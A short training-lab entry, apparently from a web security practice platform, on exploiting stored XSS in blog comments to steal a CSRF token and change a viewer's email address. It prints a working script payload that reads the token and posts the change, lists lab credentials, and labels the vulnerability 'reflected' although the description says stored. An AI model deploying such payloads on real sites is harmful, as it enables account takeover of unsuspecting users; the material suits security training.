## Exploiting XSS to bypass CSRF defenses

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

### Solution Steps
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.

### Key Payloads
- `wiener:peter`
- `/my-account/change-email`
- `email`
- `token`
- `<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>`
- `test@test.com`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected
